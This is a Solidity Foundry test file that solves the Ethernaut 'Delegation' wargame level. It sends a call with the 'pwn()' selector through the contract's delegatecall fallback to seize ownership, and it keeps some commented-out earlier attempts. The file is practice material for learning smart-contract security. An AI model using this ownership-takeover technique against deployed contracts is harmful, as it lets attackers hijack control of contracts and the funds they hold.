// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Delegation.sol";
import "src/levels/DelegationFactory.sol";

contract TestDelegation is BaseTest {
    Delegation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DelegationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);
        //            (bool success, bytes memory data) = _contract.delegatecall(
        //            abi.encodeWithSignature("setVars(uint256)", _num)
        //        );

        //        level.haha(abi.encodeWithSignature("pwn()"));
        (bool sent,) = address(level).call(abi.encodeWithSignature("pwn()"));
        require(sent, "Failed to send Ether");
        //        assertEq(level.owner(), player);

        vm.stopPrank();
    }
}
